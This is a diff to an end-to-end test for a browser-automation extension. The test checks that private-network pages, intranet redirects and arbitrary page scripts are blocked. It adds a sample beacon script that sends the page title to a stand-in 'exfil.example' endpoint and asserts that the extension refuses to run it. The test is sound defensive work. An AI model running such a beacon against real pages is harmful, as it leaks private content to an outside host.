@@ -19,6 +19,7 @@ const { chromium } = await import('playwright');
 const extensionPath = path.resolve(process.env.PARCHI_E2E_EXTENSION || path.join(process.cwd(), 'dist'));
 const userDataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'parchi-private-net-'));
 const SECRET = 'FIXTURE-PRIVATE-CONTENT';
+let exfilHits = 0;
 
 const server = http.createServer((req, res) => {
   const host = String(req.headers.host || '');
@@ -28,7 +29,14 @@ const server = http.createServer((req, res) => {
       `<!doctype html><html><head><title>${body.includes(SECRET) ? 'SECRET-TITLE' : 'fixture'}</title></head><body>${body}<input id="q"></body></html>`,
     );
   };
-  if (req.url === '/redirect') {
+  if (String(req.url).startsWith('/exfil')) {
+    exfilHits += 1;
+    res.writeHead(204);
+    res.end();
+  } else if (req.url === '/nc') {
+    res.writeHead(204); // a navigation response that never commits
+    res.end();
+  } else if (req.url === '/redirect') {
     res.writeHead(302, { location: `http://intranet-host.example:${port}/secret` });
     res.end();
   } else if (req.url === '/secret') page(`<p>${SECRET}</p>`);
@@ -41,7 +49,8 @@ const port = (server.address() as { port: number }).port;
 
 const context = await chromium.launchPersistentContext(userDataDir, {
   headless: process.env.E2E_HEADLESS !== 'false',
-  ...(process.env.PARCHI_E2E_CHROME ? { executablePath: process.env.PARCHI_E2E_CHROME } : {}),
+  // channel 'chromium' = full Chromium in new headless mode, which (unlike headless shell) loads extensions.
+  ...(process.env.PARCHI_E2E_CHROME ? { executablePath: process.env.PARCHI_E2E_CHROME } : { channel: 'chromium' }),
   args: [
     `--disable-extensions-except=${extensionPath}`,
     `--load-extension=${extensionPath}`,
@@ -85,7 +94,8 @@ try {
   await run('openTab', { url: `http://wiki.example:${port}/secret` });
   await settle();
   const read = await run('getContent', { type: 'text' });
-  check('DNS-private page is not readable', !leaked(read), read);
+  // policy type 'private-network' (not 'unverified-destination') proves the address was bound to the committed document.
+  check('DNS-private page is not readable', !leaked(read) && read?.policy?.type === 'private-network', read);
   const tabs = await run('getTabs');
   check('tab listing hides the private title', !leaked(tabs), tabs);
   const shot = await run('screenshot');
@@ -96,7 +106,11 @@ try {
   await run('openTab', { url: `http://landing.example:${port}/redirect` });
   await settle();
   const redirected = await run('getContent', { type: 'text' });
-  check('redirected private page is not readable', !leaked(redirected), redirected);
+  check(
+    'redirected private page is not readable',
+    !leaked(redirected) && redirected?.policy?.type === 'private-network',
+    redirected,
+  );
 
   // 3. Explicitly approved local host keeps working, except for an unapproved private iframe inside it.
   sessionId = 'private-net-3';
@@ -116,9 +130,27 @@ try {
   const exfil = await run('navigate', { url: 'https://forms.example/submit?d=x' });
   check('after a private read, navigating to a public site is refused', exfil?.success === false, exfil);
 
-  // 4. evaluate is arbitrary code and off by default.
-  const evaluated = await run('evaluate', { script: 'return document.title' });
+  // 4. Arbitrary page JavaScript (evaluate, waitFor scripts) is off by default and cannot beacon data out.
+  const beacon = `fetch('http://exfil.example:${port}/exfil?d=' + document.title); return true`;
+  const evaluated = await run('evaluate', { script: beacon });
   check('evaluate is refused by default', evaluated?.success === false, evaluated);
+  const waited = await run('waitFor', { script: beacon, timeoutMs: 1000 });
+  check('waitFor script is refused by default', waited?.policy?.category === 'script', waited);
+  await settle();
+  check('no request reached the exfil endpoint', exfilHits === 0, { exfilHits });
+
+  // 5. A top-level navigation that never commits (204) must not clear what is known about the current documents.
+  sessionId = 'private-net-5';
+  await run('openTab', { url: `http://approved.example:${port}/with-frame` });
+  await settle();
+  await run('navigate', { url: `http://approved.example:${port}/nc` });
+  await settle();
+  const afterNoCommit = await run('getContent', { type: 'text' });
+  check(
+    'private iframe stays blocked after an uncommitted navigation',
+    afterNoCommit?.success === false,
+    afterNoCommit,
+  );
 } finally {
   await context.close();
   server.close();
